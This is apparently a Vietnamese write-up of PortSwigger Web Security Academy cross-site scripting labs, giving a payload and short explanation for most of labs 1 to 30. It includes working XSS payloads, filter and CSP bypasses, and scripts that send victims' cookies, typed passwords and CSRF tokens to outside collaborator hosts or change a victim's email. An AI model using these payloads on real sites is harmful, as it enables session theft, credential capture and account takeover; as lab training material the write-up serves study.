# 1. Reflected XSS into HTML context with nothing encoded
Search với từ khóa `<script>alert(1)</script>`, kết quả thành công.

# 2. Stored XSS into HTML context with nothing encoded
Comment với nội dung `<script>alert(1)</script>`, kết quả thành công.

# 3. DOM XSS in `document.write` sink using source `location.search`
Xem source code, ta thấy đọc script sau:
```
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```
Như vậy, ta escape string và exploit xss bằng cách search với từ khóa `"><script>alert(1)</script>`. Kết quả thành công.

# 4. DOM XSS in `innerHTML` sink using source `location.search`
Search với từ khóa `<img src=1 onerror=alert(1)>`, kết quả thành công.

# 5. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
Ta thấy trong trang feedback có một "Back" link. Thuộc tính href trùng với parameter "returnPath" trong URL.

Như vậy, ta truy cập `/feedback?returnPath=javascript:alert(1)`, khi đó nút "Back" sẽ là:
```
<a id="backLink" href="javascript:alert(1)">Back</a>
```
Nhấn vào "Back", kết quả thành công.

# 6. DOM XSS in jQuery selector sink using a hashchange event
Website sử dụng onhashchange event để xác định chuỗi hash, sau đó dùng jQuery để tìm và scroll đến vị trí phù hợp.

![image](https://userimages.githubusercontent.com/103978452/208067541-71b34f77-dad3-4e87-9fd7-51db73e5427d.png)

Nếu ta đặt chuỗi hash thành `#<img src=1 onerror=alert(1)>` thì đoạn code sẽ là
```
var post = $('section.blog-list h2:contains(<img src=1 onerror=alert(1)>)');
```
Website sử dụng jQuery 1.8.2, như vậy phần tag `<img>` sẽ được parse và lệnh alert được thực thi. Thử submit, kết quả đúng như mong muốn.

Vào exploit server, cấu hình đoạn code sau:
```
<iframe src="https://0aed002b04df0f7ac0d9138e00280008.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
```
Như vậy ngay khi user truy cập, URL sẽ tự động thêm đoạn hash và gọi hàm print(). Click "Deliver to victim", kết quả thành công.

# 7. Reflected XSS into attribute with angle brackets HTML-encoded
Ta thấy dấu đóng mở tag đã bị encode, và search string xuất hiện ở 2 vị trí:
    
+) Trong tag h1: `<h1>0 search results for 'abc'</h1>`
    
+) Trong value của tag input: `<input type=text placeholder='Search the blog...' name=search value="abc">`
    
Như vậy, ta có thể escape value attribute và inject xss bằng cách search: `" onfocus=alert(1) autofocus="`
    
Kết quả, bài lab được giải.

# 8. Stored XSS into anchor `href` attribute with double quotes HTML-encoded
Ta thấy trong website attribute dấu nháy kép đã bị encode để vô hiệu việc escape thuộc tính href của tag a. Tuy nhiên ta có thể exploit xss bằng cách upload comment với nội dung thuộc tính website là `javascript:alert(1)`
    
Kết quả, bài lab được giải thành công.
    
# 9. Reflected XSS into a JavaScript string with angle brackets HTML encoded
Ta thấy cả dấu đóng mở tag và dấu nháy kép đã bị encoded, tuy nhiên dấu nháy đơn thì không.

Đoạn script như sau:
![image](https://user-images.githubusercontent.com/103978452/208208780-a249f412-2603-490b-8aa5-c8dbbc4e1c53.png)
Như vậy, nếu ta search với từ khóa `';alert(1);x='a`, đoạn code sẽ trở thành `var searchTerms ='';alert(1);x='a';`. Khi đó, lệnh alert sẽ được thực thi

Thử với cách làm trên, kết quả thành công.

# 10. DOM XSS in `document.write` sink using source `location.search` inside a select element
Trong trang website thông tin chi tiết về 1 sản phẩm, có đoạn script sau

![image](https://user-images.githubusercontent.com/103978452/208209503-988c1e56-28af-4efb-86b3-2b58eaf1188c.png)
Như vậy khi trong Query string có biến `storeId=abc`, thì đoạn text `abc` sẽ được thêm vào website.

Ta thay đổi query string thành `?productId=1&storeId=<script>alert(1)</script>`, kết quả lệnh alert được thực thi thành công.

# 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Website sử dụng AngularJs. Thử search với từ khóa `{{1+2}}` thì kết quả trả về 3. Như vậy, ta có thể execute code bên trong cặp dấu `{{`.

Nhận thấy dấu đóng mở tag và dấu nháy đơn đã bị encoded, tuy nhiên ta vẫn có thế sử dụng dấu nháy kép. Search với từ khóa `{{constructor.constructor("alert(1)")()}}`, kết quả lệnh alert được thực thi thành công.

# 12. Reflected DOM XSS
Ta thấy trong file `searchResults.js` có đoạn code: `eval('var searchResultsObj = ' + this.responseText);`, và trong `responseText` là chuỗi JSON có dạng `{"results":[],"searchTerm":"abc"}`, trong đó searchTerm là từ khóa ta nhập vào. Như vậy, nếu ta có thể escape chuỗi JSON và chèn vào lệnh `alert(1)`, thì lệnh `eval` sẽ khiến lệnh `alert(1)` được thực thi

Thử chèn `"`, ta thấy kí tự `\` được tự động thêm vào: `{"results":[],"searchTerm":"\""}`

Thử chèn `\"`, ta thấy với kí tự `\` vẫn giữ nguyên, đoạn JSON trở thành `{"results":[],"searchTerm":"\"}`. Như vậy ta có thể escape được string trong value của "searchTerm"

Như vậy, ta sẽ exploit XSS với payload: `\"};alert(1)//`, khi đó đoạn JSON trở thành `{"results":[],"searchTerm":"\\"};alert(1)//"}`

Thử cách trên bằng cách gửi request `GET /search-results?search=\"};alert(1)//`, kết quả thành công.

# 13. Stored DOM XSS
Ta thấy website đã chặn XSS bằng đoạn code `html.replace('<', '&lt;').replace('>', '&gt;');`. Tuy nhiên, do hàm `replace` chỉ thay thế kí tự đầu tiên trong chuỗi, nên ta có thể bypass được.

Submit một comment với phần body là `<><img src=1 onerror=alert(1)>`, kết quả thành công.

# 14. Exploiting cross-site scripting to steal cookies
Ta submit một comment chứa nội dung là đoạn code sau:
```
<script>
    fetch('https://uxv889vycw7d8z1pxaxkp4kzcqig65.oastify.com?cookie='+encodeURIComponent(document.cookie));</script>
```
Sau khi submit, vào Burp Collaborator Client kiểm tra thì thấy có request được gửi đến, trong đó có chứa session của nạn nhân

![image](https://user-images.githubusercontent.com/103978452/208383188-42d00b62-8dd5-4f8e-9d7e-7bc692eba4e4.png)

Thay đổi session của mình thành session thu được, kết quả thành công.

# 15. Exploiting cross-site scripting to capture passwords
Ta submit một comment với nội dung như sau:
```
Username: <input name="username" id="username"> <br>
Password: <input name="password" id="password" onchange="fetch('https://yfhfkkabiq0rnkku9iwffoxap1vsjh.oastify.com?usr='+username.value+'&amp;pwd='+this.value)">
```

Như vậy khi nạn nhân thấy hai form username và password, nếu user đó nhập thông tin thì một request sẽ được gửi đến Burp Collaborator Server, chứa các thông tin đó. Vào Burp Collaborator Client kiểm tra, ta thấy một request được gửi đến.

![image](https://user-images.githubusercontent.com/103978452/208921051-584d40d0-11b0-4702-92e3-7fa43d05962f.png)

Dùng thông tin thu được để login, kết quả thành công.

# 16. Exploiting XSS to perform CSRF
Ta submit một comment với phần body có nội dung:
```
<script>
xhr = new XMLHttpRequest();
xhr.onreadystatechange = () => {
    let res = xhr.responseText;
    let csrf = new DOMParser().parseFromString(res, 'text/html').querySelector('input[name=csrf]').value;
    let params = 'email=attacker%40gmail.com&csrf='+csrf;
    xhr2 = new XMLHttpRequest();
    xhr2.open('POST', '/my-account/change-email');
    xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr2.send(params);
}
xhr.open('GET', '/my-account');
xhr.send();
</script>
```
Đoạn code trên khi được thực thi sẽ truy cập `/my-account`, lấy ra csrf token rồi dùng csrf token đó để thực hiện đổi email của người dùng. Sau khi submit, kết quả thành công.

# 17. Reflected XSS into HTML context with most tags and attributes blocked
Ta thấy chức năng search đã chặn các tag HTML. Thử đưa request `GET /?search=<script>` vào Intruder rồi tiến hành bruteforce `script`, với danh sách là tên các tags. Ta thấy đối với tag `<body>` thì không hiển thị lỗi.

Thử payload `<body onload=alert(1)>` thì hiển thị lỗi `"Attribute is not allowed"`, website đã chặn hầu hết các attribute. Tiến hành brutefoce như trên đối với attribute thì phát hiện ta vẫn có thể sử dụng `onresize`.

![image](https://user-images.githubusercontent.com/103978452/208388670-224d7788-7d41-492a-bc58-6709b57cf36e.png)

Vào exploit server, thay đổi phần body thành đoạn code sau:
```
<iframe src="https://0adc000d035f895dc09086d3002500e3.web-security-academy.net/?search=<body+onresize=print()>" onload="this.width=500;"></iframe>
```
Sau khi click "Deliver to victim", kết quả thành công.

# 18. Reflected XSS into HTML context with all tags blocked except custom ones
Ta thấy chức năng search của website đã chặn tất cả các tag, tuy nhiên ta vẫn có thể inject một custom tag bình thường, ví dụ như tag `<xss>`

Khi trong URL có đoạn hash `#abc` thì website sẽ tự động focus vào phần tử có `id=abc`. Như vậy ta có thể dùng thuộc tính `autofocus` kết hợp với hash trong URL để thực thi lệnh javascript.

Vào exploit server và cấu hình đoạn HTML sau:
```
<script>document.location=https://0a6200f2049bb477c0242c69005400fd.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%281%29+tabindex%3D1%3E#x
```

Sau khi click "Deliver to victim", kết quả thành công.

# 19. Reflected XSS with some SVG markup allowed
Sau khi bruteforce với các tags và attributes, ta thấy có tag `svg` và `animateTransform` được cho phép. Cùng với đó ta có thể sử dụng thuộc tính `onbegin`.

Search trong Portswigger XSS cheatsheet, ta tìm được payload:
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

Chèn payload vào request, kết quả thành công.

# 20. Reflected XSS in canonical link tag
Trong trang "Home", ta thấy có một thẻ `<link rel="canonical"...>`

![image](https://user-images.githubusercontent.com/103978452/208432456-e17cc7f1-2a33-437a-84f7-f0b01c07702f.png)

Khi ta thay thêm query string vào trong URL, thẻ này cũng sẽ được update lại tương ứng. Ta sẽ thử escape thuộc tính `href` và thêm thuộc tính mới. Ta thấy ký tự space đã bị encode, tuy nhiên có thể dùng kí tự `/` để thay thế

Thử sử dụng URL sau làm payload:
```
https://0af50083034c3b9fc02e2cc7005f0047.web-security-academy.net/?abc'%2Faccesskey='x'%2Fonclick='alert(1)
```
khi đó canonical link tag sẽ trở thành:

![image](https://user-images.githubusercontent.com/103978452/208432860-49125927-4b4c-4ad0-b73d-998bb3faa65d.png)
Kết quả, bài lab được giải thành công.

# 21. Reflected XSS into a JavaScript string with single quote and backslash escaped
![image](https://user-images.githubusercontent.com/103978452/208794425-bc0b419c-5d8b-45e3-ab00-101a4f579b8b.png)

Website có một đoạn script gồm 2 dòng, trong đó dòng thứ nhất có dấu backslash và single quote bị escaped. Còn dòng thứ hai thì sử dụng encodeURI rồi mới chèn string vào trong URL.

Ta có thể bypass dòng code đầu tiên bằng cách search với từ khóa:
```
</script><script>alert(1)</script>
```
Khi đó dòng code đầu tiên sẽ trở thành
```
var searchTerms = '</script><alert(1)</script>';
```
Đoạn code này sẽ đóng thẻ script và chèn vào đoạn script mới. Sau khi submit, kết quả thành công.

# 22. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
Trong trang Home có chứa một thẻ script với hai dòng:

![image](https://user-images.githubusercontent.com/103978452/208795089-6790f620-b67d-401f-a2cb-662ac197e08d.png)
Sau khi thử thì ta thấy dấu ngoặc nhọn và dấu nháy kép đã bị encoded, còn dấu nháy đơn thì bị escaped. Tuy nhiên dấu backslash `\` thì lại không bị thay đổi gì.

Như vậy ta có thể bypass bằng cách search với từ khóa:
```
\';alert(1);//
```
Khi đó dòng code đầu tiên trở thành:
```
var searchTerms = '\\';alert(1);//';
```
Sau khi submit, kết quả thành công.

# 23. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
Trong chức năng comment của website, ta thấy có đoạn code: `onclick="var tracker={track(){}};tracker.track('<tên-website>');"`. Như vậy hàm tracker.track sẽ dùng tên website để làm tham số. Nhận thấy không thể sử dụng dấu đóng mở tag, dấu nháy đơn, nháy kép và backslash. Tuy nhiên, nếu hàm `tracker.track` thực hiện HTML decode, ta có thể sử dụng `&apos;` để escape javascript string. 

Thử comment với tên website là `https://&apos;-alert(1)&apos;`. Sau khi submit, kết quả thành công.

# 24. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
Khi search với từ khóa `ahel`, ta thấy từ đó xuất hiện trong một đoạn script:

![image](https://user-images.githubusercontent.com/103978452/209027414-7c316126-488b-44fa-996f-6910d02bdc4c.png)
Đoạn script sử dụng dấu backticks, như vậy ta có thể dễ dàng execute javascript bằng cách chèn payload `${alert(1)}`

Thử search với từ khóa `${alert(1)}`, kết quả thành công.

# 25. Reflected XSS with event handlers and `href` attributes blocked
Tiến hành brute-force bằng BurpIntruder, ta thấy website đã block hầu hết các thẻ và thuộc tính `href`. Tuy nhiên thẻ `<a>`, `<svg>`, `<animate>` và `<text>` vẫn được cho phép.

Từ thẻ `<animate>`, ta hoàn toàn có thể gán được thuộc tính `href` cho thẻ `<a>`. Ta dùng chức năng search với từ khóa sau:
```
<svg><a><text x=20 y=20>Click me</text><animate attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://.net?;javascript:alert(1);0">
```

Sau khi submit, bài lab được giải thành công.

# 26. Reflected XSS in a JavaScript URL with some characters blocked

# 27. Reflected XSS with AngularJS sandbox escape without strings

# 28. Reflected XSS with AngularJS sandbox escape and CSP

# 29. Reflected XSS protected by very strict CSP, with dangling markup attack
Nhận thấy trong trang `/my-account`, nếu ta thêm tham số `?email=abc` thì tag input trong chức năng đổi email cũng sẽ có giá trị là `abc`. Thử với `?email="><a>Hello</a>` thì thấy thẻ a được chèn vào. Như vậy website có hổng XSS với thuộc tính `email`. Tuy nhiên các đoạn code javascript được inject vào đều bị chặn do có strict CSP.

Ta sẽ dùng kỹ thuật "Evading CSP" để bypass CSP. Thử thay đổi 
```?email=%22%3E%3Ca+href%3D%22https%3A%2F%2Fexploit-0a2500910398f0fac059a33001b9007b.exploit-server.net%2Fexploit%22%3EClick+me%3C%2Fa%3E%3Cbase+target%3D%27``` 
Khi đó, tag `<input>` sẽ trở thành:

![image](https://user-images.githubusercontent.com/103978452/210034677-9c81f06b-1565-4161-af6b-127d5cb2f47f.png)

Ta thấy csrf token đã nằm trong thuộc tính `target` của tag `<base>`. Như vậy khi click vào thẻ `<a>`, sẽ mở ra một cửa sổ mới, với thuộc tính `window.name` chứa csrf token.

Vào exploit server, cấu hình đoạn HTML sau:

```
<script>
if(window.name==''){
document.location="https://0aab008703b2f0a4c051a494005f0030.web-security-academy.net/my-account?email=%22%3E%3Ca+href%3D%22https%3A%2F%2Fexploit-0a2500910398f0fac059a33001b9007b.exploit-server.net%2Fexploit%22%3EClick+me%3C%2Fa%3E%3Cbase+target%3D%27";
}else{
fetch('https://8irq370clmt6duqr781i0yxfo6u3is.oastify.com?code='+encodeURIComponent(window.name));
}
</script>
```

Đoạn script trên đầu tiên sẽ chuyển hướng người dùng đến trang `/my-account`, với tham số email như trên. Sau đó khi người dùng click "Click me", sẽ chuyển hướng đến exploit server và gửi csrf token về cho Burp Collaborator Server.

Vào kiểm tra Burp Collaborator Client, ta thu được csrf token của nạn nhân: `gtzFzhT14qcpDa5owXuxbfOtWCJ4cZAV`

![image](https://user-images.githubusercontent.com/103978452/210034379-96abda98-2382-42e3-a7f2-2ca5a8713ae7.png)

Vào exploit server, cấu hình lại đoạn code sau để thực hiện csrf attack, đổi email của nạn nhân:

```
<form id=form method=POST action="https://0aab008703b2f0a4c051a494005f0030.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="attacker@gmail.com">
<input type="hidden" name="csrf" value="gtzFzhT14qcpDa5owXuxbfOtWCJ4cZAV">
</form>

<script>form.submit()</script>
```

Sau khi submit, bài lab được giải thành công.

# 30. Reflected XSS protected by CSP, with CSP bypass
Ta thấy website có lỗ hổng XSS trong chức năng search, và trong CSP có directive `report-uri /csp-report?token=`

![image](https://user-images.githubusercontent.com/103978452/210028017-4c9ae655-db58-48d6-8a2d-1ca26c6c712f.png)

Ta thử thêm vào URL query string `?token=abc` thì directive report-uri trong CSP trở thành `/csp-report?token=abc`. Như vậy ta có thể inject input vào trong CSP. Trong CSP có directive `script-src 'self'` để ngăn execute inline script, tuy nhiên ta có thể ghi đè bằng cách sử dụng directive `script-src-elem`. Thử thay đổi `token=%3Bscript-src-elem+%27unsafe-inline%27`, kết quả `script-src-elem` đã được thêm vào CSP:

![image](https://user-images.githubusercontent.com/103978452/210028194-4027abce-b698-4403-9b52-79d3d107fc11.png)

Ta truy cập `<my-lab>/?token=%3Bscript-src-elem+%27unsafe-inline%27&search=%3Cscript%3Ealert(1)%3C/script%3E`, kết quả lệnh alert đã được thực thi thành công, bài lab được giải.
